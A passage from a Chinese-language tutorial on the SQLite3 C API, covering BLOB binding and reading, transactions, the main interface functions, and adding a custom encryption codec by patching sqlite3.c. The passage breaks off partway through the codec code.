bind完了之后，二进制数据就进入了你的“sql语句”里了。你现在可以把它保存到数据库里： 1int result = sqlite3_step( stat ); 通过这个语句，stat 表示的sql语句就被写到了数据库里。 最后，要把 sqlite3_stmt 结构给释放： 1sqlite3_finalize( stat ); //把刚才分配的内容析构掉 （2）读出二进制 下面说读二进制的步骤。 跟前面一样，先声明 sqlite3_stmt * 类型变量： 1sqlite3_stmt * stat; 然后，把一个 sql 语句解析到 stat 结构里去： 1sqlite3_prepare( db, “select * from Tbl_2”, -1, &amp;stat, 0 ); 当 prepare 成功之后（返回值是 SQLITE_OK ），开始查询数据。 1int result = sqlite3_step( stat ); 这一句的返回值是SQLITE_ROW 时表示成功（不是 SQLITE_OK ）。 你可以循环执行sqlite3_step 函数，一次step查询出一条记录。直到返回值不为 SQLITE_ROW 时表示查询结束。 然后开始获取第一个字段：ID 的值。ID是个整数，用下面这个语句获取它的值： 1int id = sqlite3_column_int( stat, 0 ); //第2个参数表示获取第几个字段内容，从0开始计算，因为我的表的ID字段是第一个字段，因此这里我填0 下面开始获取 file_content 的值，因为 file_content 是二进制，因此我需要得到它的指针，还有它的长度： 123const void * pFileContent = sqlite3_column_blob( stat, 1 );int len = sqlite3_column_bytes( stat, 1 ); 这样就得到了二进制的值。 把 pFileContent 的内容保存出来之后，不要忘了释放 sqlite3_stmt 结构： 1sqlite3_finalize( stat ); //把刚才分配的内容析构掉 （3）重复使用 sqlite3_stmt 结构 如果你需要重复使用 sqlite3_prepare 解析好的 sqlite3_stmt 结构，需要用函数： sqlite3_reset。 1result = sqlite3_reset(stat); 这样， stat 结构又成为 sqlite3_prepare 完成时的状态，你可以重新为它 bind 内容。 4 事务处理 sqlite 是支持事务处理的。如果你知道你要同步删除很多数据，不仿把它们做成一个统一的事务。 通常一次 sqlite3_exec 就是一次事务，如果你要删除1万条数据，sqlite就做了1万次：开始新事务-&gt;删除一条数据-&gt;提交事务-&gt;开始新事务-&gt;… 的过程。这个操作是很慢的。因为时间都花在了开始事务、提交事务上。 你可以把这些同类操作做成一个事务，这样如果操作错误，还能够回滚事务。 事务的操作没有特别的接口函数，它就是一个普通的 sql 语句而已： 分别如下： 1234567int result; result = sqlite3_exec( db, &quot;begin transaction&quot;, 0, 0, &amp;zErrorMsg ); //开始一个事务result = sqlite3_exec( db, &quot;commit transaction&quot;, 0, 0, &amp;zErrorMsg ); //提交事务result = sqlite3_exec( db, &quot;rollback transaction&quot;, 0, 0, &amp;zErrorMsg ); //回滚事务 四、C/C++开发接口简介1 总览SQLite3是SQLite一个全新的版本,它虽然是在SQLite 2.8.13的代码基础之上开发的,但是使用了和之前的版本不兼容的数据库格式和API. SQLite3是为了满足以下的需求而开发的: 支持UTF-16编码. 用户自定义的文本排序方法. 可以对BLOBs字段建立索引. 因此为了支持这些特性我改变了数据库的格式,建立了一个与之前版本不兼容的3.0版. 至于其他的兼容性的改变,例如全新的API等等,都将在理论介绍之后向你说明,这样可以使你最快的一次性摆脱兼容性问题. 3.0版的和2.X版的API非常相似,但是有一些重要的改变需要注意. 所有API接口函数和数据结构的前缀都由”sqlite_”改为了”sqlite3_”. 这是为了避免同时使用SQLite 2.X和SQLite 3.0这两个版本的时候发生链接冲突. 由于对于C语言应该用什么数据类型来存放UTF-16编码的字符串并没有一致的规范. 因此SQLite使用了普通的void类型来指向UTF-16编码的字符串. 客户端使用过程中可以把void映射成适合他们的系统的任何数据类型. 2 C/C++接口 SQLite 3.0一共有83个API函数,此外还有一些数据结构和预定义(#defines). (完整的API介绍请参看另一份文档.) 不过你们可以放心,这些接口使用起来不会像它的数量所暗示的那么复杂. 最简单的程序仍然使用三个函数就可以完成: sqlite3_open(), sqlite3_exec(), 和 sqlite3_close(). 要是想更好的控制数据库引擎的执行,可以使用提供的sqlite3_prepare()函数把SQL语句编译成字节码,然后在使用sqlite3_step()函数来执行编译后的字节码. 以sqlite3_column_开头的一组API函数用来获取查询结果集中的信息. 许多接口函数都是成对出现的,同时有UTF-8和UTF-16两个版本. 并且提供了一组函数用来执行用户自定义的SQL函数和文本排序函数. （1）如何打开关闭数据库 12345678910111213 typedef struct sqlite3 sqlite3; int sqlite3_open(const char*, sqlite3**); int sqlite3_open16(const void*, sqlite3**); int sqlite3_close(sqlite3*); const char *sqlite3_errmsg(sqlite3*); const void *sqlite3_errmsg16(sqlite3*); int sqlite3_errcode(sqlite3*); sqlite3_open() 函数返回一个整数错误代码,而不是像第二版中一样返回一个指向sqlite3结构体的指针. sqlite3_open() 和sqlite3_open16() 的不同之处在于sqlite3_open16() 使用UTF-16编码(使用本地主机字节顺序)传递数据库文件名. 如果要创建新数据库, sqlite3_open16() 将内部文本转换为UTF-16编码, 反之sqlite3_open() 将文本转换为UTF-8编码. 打开或者创建数据库的命令会被缓存,直到这个数据库真正被调用的时候才会被执行. 而且允许使用PRAGMA声明来设置如本地文本编码或默认内存页面大小等选项和参数. sqlite3_errcode() 通常用来获取最近调用的API接口返回的错误代码. sqlite3_errmsg() 则用来得到这些错误代码所对应的文字说明. 这些错误信息将以 UTF-8 的编码返回,并且在下一次调用任何SQLite API函数的时候被清除. sqlite3_errmsg16() 和sqlite3_errmsg() 大体上相同,除了返回的错误信息将以 UTF-16 本机字节顺序编码. SQLite3的错误代码相比SQLite2没有任何的改变,它们分别是: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#define SQLITE_OK 0 /* Successful result */#define SQLITE_ERROR 1 /* SQL error or missing database */#define SQLITE_INTERNAL 2 /* An internal logic error in SQLite */#define SQLITE_PERM 3 /* Access permission denied */#define SQLITE_ABORT 4 /* Callback routine requested an abort */#define SQLITE_BUSY 5 /* The database file is locked */#define SQLITE_LOCKED 6 /* A table in the database is locked */#define SQLITE_NOMEM 7 /* A malloc() failed */#define SQLITE_READONLY 8 /* Attempt to write a readonly database */#define SQLITE_INTERRUPT 9 /* Operation terminated by sqlite_interrupt() */#define SQLITE_IOERR 10 /* Some kind of disk I/O error occurred */#define SQLITE_CORRUPT 11 /* The database disk image is malformed */#define SQLITE_NOTFOUND 12 /* (Internal Only) Table or record not found */#define SQLITE_FULL 13 /* Insertion failed because database is full */#define SQLITE_CANTOPEN 14 /* Unable to open the database file */#define SQLITE_PROTOCOL 15 /* Database lock protocol error */#define SQLITE_EMPTY 16 /* (Internal Only) Database table is empty */#define SQLITE_SCHEMA 17 /* The database schema changed */#define SQLITE_TOOBIG 18 /* Too much data for one row of a table */#define SQLITE_CONSTRAINT 19 /* Abort due to contraint violation */#define SQLITE_MISMATCH 20 /* Data type mismatch */#define SQLITE_MISUSE 21 /* Library used incorrectly */#define SQLITE_NOLFS 22 /* Uses OS features not supported on host */#define SQLITE_AUTH 23 /* Authorization denied */#define SQLITE_ROW 100 /* sqlite_step() has another row ready */#define SQLITE_DONE 101 /* sqlite_step() has finished executing */ （2）执行 SQL 语句 123typedef int (*sqlite_callback)(void*,int,char**, char**);int sqlite3_exec(sqlite3*, const char *sql, sqlite_callback, void*, char**); sqlite3_exec 函数依然像它在SQLite2中一样承担着很多的工作. 该函数的第二个参数中可以编译和执行零个或多个SQL语句. 查询的结果返回给回调函数. 更多地信息可以查看API 参考. 在SQLite3里,sqlite3_exec一般是被准备SQL语句接口封装起来使用的. 123456789typedef struct sqlite3_stmt sqlite3_stmt;int sqlite3_prepare(sqlite3*, const char*, int, sqlite3_stmt**, const char**);int sqlite3_prepare16(sqlite3*, const void*, int, sqlite3_stmt**, const void**);int sqlite3_finalize(sqlite3_stmt*);int sqlite3_reset(sqlite3_stmt*); sqlite3_prepare 接口把一条SQL语句编译成字节码留给后面的执行函数. 使用该接口访问数据库是当前比较好的的一种方法. sqlite3_prepare() 处理的SQL语句应该是UTF-8编码的. 而sqlite3_prepare16() 则要求是UTF-16编码的. 输入的参数中只有第一个SQL语句会被编译. 第四个参数则用来指向输入参数中下一个需要编译的SQL语句存放的SQLite statement对象的指针,任何时候如果调用 sqlite3_finalize() 将销毁一个准备好的SQL声明. 在数据库关闭之前，所有准备好的声明都必须被释放销毁. sqlite3_reset() 函数用来重置一个SQL声明的状态，使得它可以被再次执行. SQL声明可以包含一些型如”?” 或 “?nnn” 或 “:aaa”的标记， 其中”nnn” 是一个整数，”aaa” 是一个字符串. 这些标记代表一些不确定的字符值（或者说是通配符），可以在后面用sqlite3_bind 接口来填充这些值. 每一个通配符都被分配了一个编号（由它在SQL声明中的位置决定，从1开始），此外也可以用 “nnn” 来表示 “?nnn” 这种情况. 允许相同的通配符在同一个SQL声明中出现多次, 在这种情况下所有相同的通配符都会被替换成相同的值. 没有被绑定的通配符将自动取NULL值. 123456789101112131415int sqlite3_bind_blob(sqlite3_stmt*, int, const void*, int n, void(*)(void*));int sqlite3_bind_double(sqlite3_stmt*, int, double);int sqlite3_bind_int(sqlite3_stmt*, int, int);int sqlite3_bind_int64(sqlite3_stmt*, int, long long int);int sqlite3_bind_null(sqlite3_stmt*, int);int sqlite3_bind_text(sqlite3_stmt*, int, const char*, int n, void(*)(void*));int sqlite3_bind_text16(sqlite3_stmt*, int, const void*, int n, void(*)(void*));int sqlite3_bind_value(sqlite3_stmt*, int, const sqlite3_value*); 以上是 sqlite3_bind 所包含的全部接口，它们是用来给SQL声明中的通配符赋值的. 没有绑定的通配符则被认为是空值.绑定上的值不会被sqlite3_reset()函数重置. 但是在调用了sqlite3_reset()之后所有的通配符都可以被重新赋值. 在SQL声明准备好之后(其中绑定的步骤是可选的), 需要调用以下的方法来执行: 1int sqlite3_step(sqlite3_stmt*); 如果SQL返回了一个单行结果集，sqlite3_step() 函数将返回 SQLITE_ROW , 如果SQL语句执行成功或者正常将返回SQLITE_DONE , 否则将返回错误代码. 如果不能打开数据库文件则会返回 SQLITE_BUSY . 如果函数的返回值是SQLITE_ROW, 那么下边的这些方法可以用来获得记录集行中的数据: 123456789101112131415161718192021222324252627const void *sqlite3_column_blob(sqlite3_stmt*, int iCol);int sqlite3_column_bytes(sqlite3_stmt*, int iCol);int sqlite3_column_bytes16(sqlite3_stmt*, int iCol);int sqlite3_column_count(sqlite3_stmt*);const char *sqlite3_column_decltype(sqlite3_stmt *, int iCol);const void *sqlite3_column_decltype16(sqlite3_stmt *, int iCol);double sqlite3_column_double(sqlite3_stmt*, int iCol);int sqlite3_column_int(sqlite3_stmt*, int iCol);long long int sqlite3_column_int64(sqlite3_stmt*, int iCol);const char *sqlite3_column_name(sqlite3_stmt*, int iCol);const void *sqlite3_column_name16(sqlite3_stmt*, int iCol);const unsigned char *sqlite3_column_text(sqlite3_stmt*, int iCol);const void *sqlite3_column_text16(sqlite3_stmt*, int iCol);int sqlite3_column_type(sqlite3_stmt*, int iCol); sqlite3_column_count()函数返回结果集中包含的列数. sqlite3_column_count() 可以在执行了 sqlite3_prepare()之后的任何时刻调用. sqlite3_data_count()除了必需要在sqlite3_step()之后调用之外，其他跟sqlite3_column_count() 大同小异. 如果调用sqlite3_step() 返回值是 SQLITE_DONE 或者一个错误代码, 则此时调用sqlite3_data_count() 将返回 0 ，然而sqlite3_column_count() 仍然会返回结果集中包含的列数. 返回的记录集通过使用其它的几个 sqlite3_column_***() 函数来提取, 所有的这些函数都把列的编号作为第二个参数. 列编号从左到右以零起始. 请注意它和之前那些从1起始的参数的不同. sqlite3_column_type()函数返回第N列的值的数据类型. 具体的返回值如下: 123456789#define SQLITE_INTEGER 1#define SQLITE_FLOAT 2#define SQLITE_TEXT 3#define SQLITE_BLOB 4#define SQLITE_NULL 5 sqlite3_column_decltype() 则用来返回该列在 CREATE TABLE 语句中声明的类型. 它可以用在当返回类型是空字符串的时候. sqlite3_column_name() 返回第N列的字段名. sqlite3_column_bytes() 用来返回 UTF-8 编码的BLOBs列的字节数或者TEXT字符串的字节数. sqlite3_column_bytes16() 对于BLOBs列返回同样的结果，但是对于TEXT字符串则按 UTF-16 的编码来计算字节数. sqlite3_column_blob() 返回 BLOB 数据. sqlite3_column_text() 返回 UTF-8 编码的 TEXT 数据. sqlite3_column_text16() 返回 UTF-16 编码的 TEXT 数据. sqlite3_column_int() 以本地主机的整数格式返回一个整数值. sqlite3_column_int64() 返回一个64位的整数. 最后, sqlite3_column_double() 返回浮点数. 不一定非要按照sqlite3_column_type()接口返回的数据类型来获取数据. 数据类型不同时软件将自动转换. （3）用户自定义函数 可以使用以下的方法来创建用户自定义的SQL函数: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051typedef struct sqlite3_value sqlite3_value;int sqlite3_create_function( sqlite3 *, const char *zFunctionName, int nArg, int eTextRep, void*, void (*xFunc)(sqlite3_context*,int,sqlite3_value**), void (*xStep)(sqlite3_context*,int,sqlite3_value**), void (*xFinal)(sqlite3_context*) ); int sqlite3_create_function16( sqlite3*, const void *zFunctionName, int nArg, int eTextRep, void*, void (*xFunc)(sqlite3_context*,int,sqlite3_value**), void (*xStep)(sqlite3_context*,int,sqlite3_value**), void (*xFinal)(sqlite3_context*) ); #define SQLITE_UTF8 1 #define SQLITE_UTF16 2 #define SQLITE_UTF16BE 3 #define SQLITE_UTF16LE 4 #define SQLITE_ANY 5 nArg 参数用来表明自定义函数的参数个数. 如果参数值为0，则表示接受任意个数的参数. 用 eTextRep 参数来表明传入参数的编码形式. 参数值可以是上面的五种预定义值. SQLite3 允许同一个自定义函数有多种不同的编码参数的版本. 数据库引擎会自动选择转换参数编码个数最少的版本使用. 普通的函数只需要设置 xFunc 参数，而把 xStep 和 xFinal 设为NULL. 聚合函数则需要设置 xStep 和 xFinal 参数，然后把 xFunc 设为NULL. 该方法和使用sqlite3_create_aggregate() API一样. sqlite3_create_function16()和sqlite_create_function()的不同就在于自定义的函数名一个要求是 UTF-16 编码，而另一个则要求是 UTF-8. 请注意自定函数的参数目前使用了sqlite3_value结构体指针替代了SQLite version 2.X中的字符串指针. 下面的函数用来从sqlite3_value结构体中提取数据: 1234567891011121314151617 const void *sqlite3_value_blob(sqlite3_value*); int sqlite3_value_bytes(sqlite3_value*); int sqlite3_value_bytes16(sqlite3_value*); double sqlite3_value_double(sqlite3_value*); int sqlite3_value_int(sqlite3_value*); long long int sqlite3_value_int64(sqlite3_value*); const unsigned char *sqlite3_value_text(sqlite3_value*); const void *sqlite3_value_text16(sqlite3_value*); int sqlite3_value_type(sqlite3_value*); 上面的函数调用以下的API来获得上下文内容和返回结果: 123456789101112131415161718192021222324252627 void *sqlite3_aggregate_context(sqlite3_context*, int nbyte); void *sqlite3_user_data(sqlite3_context*); void sqlite3_result_blob(sqlite3_context*, const void*, int n, void(*)(void*)); void qlite3_result_double(sqlite3_context*, double); void sqlite3_result_error(sqlite3_context*, const char*, int); void sqlite3_result_error16(sqlite3_context*, const void*, int); void sqlite3_result_int(sqlite3_context*, int); void sqlite3_result_int64(sqlite3_context*, long long int); void sqlite3_result_null(sqlite3_context*); void sqlite3_result_text(sqlite3_context*, const char*, int n, void(*)(void*)); void sqlite3_result_text16(sqlite3_context*, const void*, int n, void(*)(void*)); void sqlite3_result_value(sqlite3_context*, sqlite3_value*); void *sqlite3_get_auxdata(sqlite3_context*, int); void sqlite3_set_auxdata(sqlite3_context*, int, void*, void (*)(void*)); （4）用户自定义排序规则 下面的函数用来实现用户自定义的排序规则: 123456789101112131415sqlite3_create_collation(sqlite3*, const char *zName, int eTextRep, void*,int(*xCompare)(void*,int,const void*,int,const void*));sqlite3_create_collation16(sqlite3*, const void *zName, int eTextRep, void*,int(*xCompare)(void*,int,const void*,int,const void*));sqlite3_collation_needed(sqlite3*, void*,void(*)(void*,sqlite3*,int eTextRep,const char*));sqlite3_collation_needed16(sqlite3*, void*,void(*)(void*,sqlite3*,int eTextRep,const void*)); sqlite3_create_collation() 函数用来声明一个排序序列和实现它的比较函数. 比较函数只能用来做文本的比较. eTextRep 参数可以取如下的预定义值 SQLITE_UTF8, SQLITE_UTF16LE, SQLITE_UTF16BE, SQLITE_ANY，用来表示比较函数所处理的文本的编码方式. 同一个自定义的排序规则的同一个比较函数可以有 UTF-8, UTF-16LE 和 UTF-16BE 等多个编码的版本. sqlite3_create_collation16()和sqlite3_create_collation() 的区别也仅仅在于排序名称的编码是 UTF-16 还是 UTF-8. 可以使用 sqlite3_collation_needed() 函数来注册一个回调函数，当数据库引擎遇到未知的排序规则时会自动调用该函数. 在回调函数中可以查找一个相似的比较函数，并激活相应的sqlite_3_create_collation()函数. 回调函数的第四个参数是排序规则的名称，同样sqlite3_collation_needed采用 UTF-8 编码. sqlite3_collation_need16() 采用 UTF-16 编码. 五、给数据库加密前面所说的内容网上已经有很多资料，虽然比较零散，但是花点时间也还是可以找到的。现在要说的这个——数据库加密，资料就很难找。也可能是我操作水平不够，找不到对应资料。但不管这样，我还是通过网上能找到的很有限的资料，探索出了给sqlite数据库加密的完整步骤。 这里要提一下，虽然 sqlite 很好用，速度快、体积小巧。但是它保存的文件却是明文的。若不信可以用 NotePad 打开数据库文件瞧瞧，里面 insert 的内容几乎一览无余。这样赤裸裸的展现自己，可不是我们的初衷。当然，如果你在嵌入式系统、智能手机上使用 sqlite，最好是不加密，因为这些系统运算能力有限，你做为一个新功能提供者，不能把用户有限的运算能力全部花掉。 Sqlite为了速度而诞生。因此Sqlite本身不对数据库加密，要知道，如果你选择标准AES算法加密，那么一定有接近50%的时间消耗在加解密算法上，甚至更多（性能主要取决于你算法编写水平以及你是否能使用cpu提供的底层运算能力，比如MMX或sse系列指令可以大幅度提升运算速度）。 Sqlite免费版本是不提供加密功能的，当然你也可以选择他们的收费版本，那你得支付2000块钱，而且是USD。我这里也不是说支付钱不好，如果只为了数据库加密就去支付2000块，我觉得划不来。因为下面我将要告诉你如何为免费的Sqlite扩展出加密模块——自己动手扩展，这是Sqlite允许，也是它提倡的。 那么，就让我们一起开始为 sqlite3.c 文件扩展出加密模块。 1 必要的宏 通过阅读 Sqlite 代码（当然没有全部阅读完，6万多行代码，没有一行是我习惯的风格，我可没那么多眼神去看），我搞清楚了两件事： Sqlite是支持加密扩展的； 需要 #define 一个宏才能使用加密扩展。 这个宏就是 SQLITE_HAS_CODEC。 你在代码最前面（也可以在 sqlite3.h 文件第一行）定义： 12345#ifndef SQLITE_HAS_CODEC#define SQLITE_HAS_CODEC#endif 如果你在代码里定义了此宏，但是还能够正常编译，那么应该是操作没有成功。因为你应该会被编译器提示有一些函数无法链接才对。如果你用的是 VC 2003，你可以在“解决方案”里右键点击你的工程，然后选“属性”，找到“C/C++”，再找到“命令行”，在里面手工添加“/D “SQLITE_HAS_CODEC””。 定义了这个宏，一些被 Sqlite 故意屏蔽掉的代码就被使用了。这些代码就是加解密的接口。 尝试编译，vc会提示你有一些函数无法链接，因为找不到他们的实现。 如果你也用的是VC2003，那么会得到下面的提示： 123456789error LNK2019: 无法解析的外部符号 _sqlite3CodecGetKey ，该符号在函数 _attachFunc 中被引用error LNK2019: 无法解析的外部符号 _sqlite3CodecAttach ，该符号在函数 _attachFunc 中被引用error LNK2019: 无法解析的外部符号 _sqlite3_activate_see ，该符号在函数 _sqlite3Pragma 中被引用error LNK2019: 无法解析的外部符号 _sqlite3_key ，该符号在函数 _sqlite3Pragma 中被引用fatal error LNK1120: 4 个无法解析的外部命令 这是正常的，因为Sqlite只留了接口而已，并没有给出实现。 下面就让我来实现这些接口。 2自己实现加解密接口函数 如果真要我从一份 www.sqlite.org 网上down下来的 sqlite3.c 文件，直接摸索出这些接口的实现，我认为我还没有这个能力。 好在网上还有一些代码已经实现了这个功能。通过参照他们的代码以及不断编译中vc给出的错误提示，最终我把整个接口整理出来。 实现这些预留接口不是那么容易，要重头说一次怎么回事很困难。我把代码都写好了，直接把他们按我下面的说明拷贝到 sqlite3.c 文件对应地方即可。我在下面也提供了sqlite3.c 文件，可以直接参考或取下来使用。 这里要说一点的是，我另外新建了两个文件：crypt.c和crypt.h。 其中crypt.h如此定义： 123456789101112131415161718192021222324252627#ifndef DCG_SQLITE_CRYPT_FUNC_#define DCG_SQLITE_CRYPT_FUNC_/***********董淳光写的 SQLITE 加密关键函数库***********//***********关键加密函数***********/int My_Encrypt_Func( unsigned char * pData, unsigned int data_len, const char * key, unsigned int len_of_key );/***********关键解密函数***********/int My_DeEncrypt_Func( unsigned char * pData, unsigned int data_len, const char * key, unsigned intlen_of_key );#endif 其中的 crypt.c 如此定义： 12345678910111213141516171819202122232425262728293031#include &quot;./crypt.h&quot;#include &quot;memory.h&quot;/***********关键加密函数***********/int My_Encrypt_Func( unsigned char * pData, unsigned int data_len, const char * key, unsigned int len_of_key ){return 0;}/***********关键解密函数***********/int My_DeEncrypt_Func( unsigned char * pData, unsigned int data_len, const char * key, unsigned intlen_of_key ){return 0;} 这个文件很容易看，就两函数，一个加密一个解密。传进来的参数分别是待处理的数据、数据长度、密钥、密钥长度。 处理时直接把结果作用于 pData 指针指向的内容。 你需要定义自己的加解密过程，就改动这两个函数，其它部分不用动。扩展起来很简单。 这里有个特点，data_len 一般总是 1024 字节。正因为如此，你可以在你的算法里使用一些特定长度的加密算法，比如AES要求被加密数据一定是128位（16字节）长。这个1024不是碰巧，而是 Sqlite 的页定义是1024字节，在sqlite3.c文件里有定义: 1# define SQLITE_DEFAULT_PAGE_SIZE 1024 你可以改动这个值，不过还是建议没有必要不要去改它。 上面写了两个扩展函数，如何把扩展函数跟 Sqlite 挂接起来，这个过程说起来比较麻烦。我直接贴代码。 分3个步骤。 首先，在 sqlite3.c 文件顶部，添加下面内容： 12345678910111213#ifdef SQLITE_HAS_CODEC#include &quot;./crypt.h&quot;/***********用于在 sqlite3 最后关闭时释放一些内存***********/void sqlite3pager_free_codecarg(void *pArg);#endif 这个函数之所以要在 sqlite3.c 开头声明，是因为下面在 sqlite3.c 里面某些函数里要插入这个函数调用。所以要提前声明。 其次，在sqlite3.c文件里搜索“sqlite3PagerClose”函数，要找到它的实现代码（而不是声明代码）。 实现代码里一开始是： 12345678910111213141516171819#ifdef SQLITE_ENABLE_MEMORY_MANAGEMENT /* A malloc() cannot fail in sqlite3ThreadData() as one or more calls to ** malloc() must have already been made by this thread before it gets ** to this point. This means the ThreadData must have been allocated already ** so that ThreadData.nAlloc can be set. */ ThreadData *pTsd = sqlite3ThreadData(); assert( pPager ); assert( pTsd &amp;&amp; pTsd-&gt;nAlloc );#endif 需要在这部分后面紧接着插入： 12345#ifdef SQLITE_HAS_CODEC sqlite3pager_free_codecarg(pPager-&gt;pCodecArg);#endif 这里要注意，sqlite3PagerClose 函数大概也是 3.3.17版本左右才改名的，以前版本里是叫 “sqlite3pager_close”。因此你在老版本sqlite代码里搜索“sqlite3PagerClose”是搜不到的。 类似的还有“sqlite3pager_get”、“sqlite3pager_unref”、“sqlite3pager_write”、“sqlite3pager_pagecount”等都是老版本函数，它们在 pager.h 文件里定义。新版本对应函数是在 sqlite3.h 里定义（因为都合并到 sqlite3.c和sqlite3.h两文件了）。所以，如果你在使用老版本的sqlite，先看看 pager.h 文件，这些函数不是消失了，也不是新蹦出来的，而是老版本函数改名得到的。 最后，往sqlite3.c 文件下找。找到最后一行： 1/************** End of main.c ************************************************/ 在这一行后面，接上本文最下面的代码段。 这些代码很长，我不再解释，直接接上去就得了。 唯一要提的是 DeriveKey 函数。这个函数是对密钥的扩展。比如，你要求密钥是128位，即是16字节，但是如果用户只输入 1个字节呢？2个字节呢？或输入50个字节呢？你得对密钥进行扩展，使之符合16字节的要求。 DeriveKey 函数就是做这个扩展的。有人把接收到的密钥求md5，这也是一个办法，因为md5运算结果固定16字节，不论你有多少字符，最后就是16字节。这是md5算法的特点。但是我不想用md5，因为还得为它添加包含一些 md5 的.c或.cpp文件。我不想这么做。我自己写了一个算法来扩展密钥，很简单的算法。当然，你也可以使用你的扩展方法，也而可以使用md5 算法。只要修改 DeriveKey 函数就可以了。 在 DeriveKey 函数里，只管申请空间构造所需要的密钥，不需要释放，因为在另一个函数里有释放过程，而那个函数会在数据库关闭时被调用。参考我的 DeriveKey 函数来申请内存。 这里我给出我已经修改好的 sqlite3.c 和 sqlite3.h 文件。 如果太懒，就直接使用这两个文件，编译肯定能通过，运行也正常。当然，你必须按我前面提的，新建 crypt.h 和crypt.c 文件，而且函数要按我前面定义的要求来做。 3 加密使用方法 现在，你代码已经有了加密功能。 你要把加密功能给用上，除了改 sqlite3.c 文件、给你工程添加 SQLITE_HAS_CODEC 宏，还得修改你的数据库调用函数。 前面提到过，要开始一个数据库操作，必须先 sqlite3_open 。 加解密过程就在 sqlite3_open 后面操作。 假设你已经 sqlite3_open 成功了，紧接着写下面的代码： 123456789 int i;//添加、使用密码 i = sqlite3_key( db, &quot;dcg&quot;, 3 ); //修改密码 i = sqlite3_rekey( db, &quot;dcg&quot;, 0 ); 用 sqlite3_key 函数来提交密码。 第1个参数是 sqlite3 * 类型变量，代表着用 sqlite3_open 打开的数据库（或新建数据库）。 第2个参数是密钥。 第3个参数是密钥长度。 用 sqlite3_rekey 来修改密码。参数含义同 sqlite3_key。 实际上，你可以在sqlite3_open函数之后，到 sqlite3_close 函数之前任意位置调用 sqlite3_key 来设置密码。 但是如果你没有设置密码，而数据库之前是有密码的，那么你做任何操作都会得到一个返回值：SQLITE_NOTADB，并且得到错误提示：“file is encrypted or is not a database”。 只有当你用 sqlite3_key 设置了正确的密码，数据库才会正常工作。 如果你要修改密码，前提是你必须先 sqlite3_open 打开数据库成功，然后 sqlite3_key 设置密钥成功，之后才能用sqlite3_rekey 来修改密码。 如果数据库有密码，但你没有用 sqlite3_key 设置密码，那么当你尝试用 sqlite3_rekey 来修改密码时会得到SQLITE_NOTADB 返回值。 如果你需要清空密码，可以使用： 123//修改密码i = sqlite3_rekey( db, NULL, 0 ); 来完成密码清空功能。 4 sqlite3.c 最后添加代码段 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641/***董淳光定义的加密函数***/#ifdef SQLITE_HAS_CODEC/***加密结构***/#define CRYPT_OFFSET 8typedef struct _CryptBlock{BYTE* ReadKey; // 读数据库和写入事务的密钥BYTE* WriteKey; // 写入数据库的密钥int PageSize; // 页的大小BYTE* Data;} CryptBlock, *LPCryptBlock;#ifndef DB_KEY_LENGTH_BYTE /*密钥长度*/#define DB_KEY_LENGTH_BYTE 16 /*密钥长度*/#endif#ifndef DB_KEY_PADDING /*密钥位数不足时补充的字符*/#define DB_KEY_PADDING 0x33 /*密钥位数不足时补充的字符*/#endif/*** 下面是编译时提示缺少的函数 ***//** 这个函数不需要做任何处理，获取密钥的部分在下面 DeriveKey 函数里实现 **/void sqlite3CodecGetKey(sqlite3* db, int nDB, void** Key, int* nKey){return ;}/*被sqlite 和 sqlite3_key_interop 调用, 附加密钥到数据库.*/int sqlite3CodecAttach(sqlite3 *db, int nDb, const void *pKey, int nKeyLen);/**这个函数好像是 sqlite 3.3.17前不久才加的，以前版本的sqlite里没有看到这个函数这个函数我还没有搞清楚是做什么的，它里面什么都不做直接返回，对加解密没有影响**/void sqlite3_activate_see(const char* right ){ return;}int sqlite3_key(sqlite3 *db, const void *pKey, int nKey);int sqlite3_rekey(sqlite3 *db, const void *pKey, int nKey);/***下面是上面的函数的辅助处理函数***/// 从用户提供的缓冲区中得到一个加密密钥// 用户提供的密钥可能位数上满足不了要求，使用这个函数来完成密钥扩展static unsigned char * DeriveKey(const void *pKey, int nKeyLen);//创建或更新一个页的加密算法索引.此函数会申请缓冲区.static LPCryptBlock CreateCryptBlock(unsigned char* hKey, Pager *pager, LPCryptBlock pExisting);//加密/解密函数, 被pager调用void * sqlite3Codec(void *pArg, unsigned char *data, Pgno nPageNum, int nMode);//设置密码函数int __stdcall sqlite3_key_interop(sqlite3 *db, const void *pKey, int nKeySize);// 修改密码函数int __stdcall sqlite3_rekey_interop(sqlite3 *db, const void *pKey, int nKeySize);//销毁一个加密块及相关的缓冲区,密钥.static void DestroyCryptBlock(LPCryptBlock pBlock);static void * sqlite3pager_get_codecarg(Pager *pPager);void sqlite3pager_set_codec(Pager *pPager,void *(*xCodec)(void*,void*,Pgno,int),void *pCodecArg );//加密/解密函数, 被pager调用void * sqlite3Codec(void *pArg, unsigned char *data, Pgno nPageNum, int nMode){LPCryptBlock pBlock = (LPCryptBlock)pArg;unsigned int dwPageSize = 0;if (!pBlock) return data;// 确保pager的页长度和加密块的页长度相等.如果改变,就需要调整.if (nMode != 2){ PgHdr *pageHeader; pageHeader = DATA_TO_PGHDR(data); if (pageHeader-&gt;pPager-&gt;pageSize != pBlock-&gt;PageSize) { CreateCryptBlock(0, pageHeader-&gt;pPager, pBlock); }}switch(nMode){case 0: // Undo a &quot;case 7&quot; journal file encryptioncase 2: //重载一个页case 3: //载入一个页 if (!pBlock-&gt;ReadKey) break; dwPageSize = pBlock-&gt;PageSize; 